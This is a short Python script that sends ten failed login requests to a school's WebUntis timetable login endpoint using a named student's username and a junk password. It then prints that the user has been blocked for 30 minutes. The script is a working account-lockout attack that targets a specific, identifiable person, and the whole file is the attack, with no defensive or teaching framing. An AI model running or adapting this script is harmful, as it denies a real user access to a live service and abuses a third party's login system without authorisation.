"""importing Modules"""
import requests

class WebUntis():
    """class"""
    def __init__(self) -> None:
        self.url = "https://aoide.webuntis.com/WebUntis/j_spring_security_check"
        self.payload = {
            'school': 'htbla-weiz',
            'j_username': 'schnei190114',
            'j_password': 'weeeeeeeeeeeeeeeeeeee',
            'token': ''
        }

    def main(self):
        """sends requests to the server"""
        for counter in range(10):
            with requests.Session() as session:
                session.post(self.url, data=self.payload)
        print("successfull blocked the user for 30mins")

WebUntis().main()
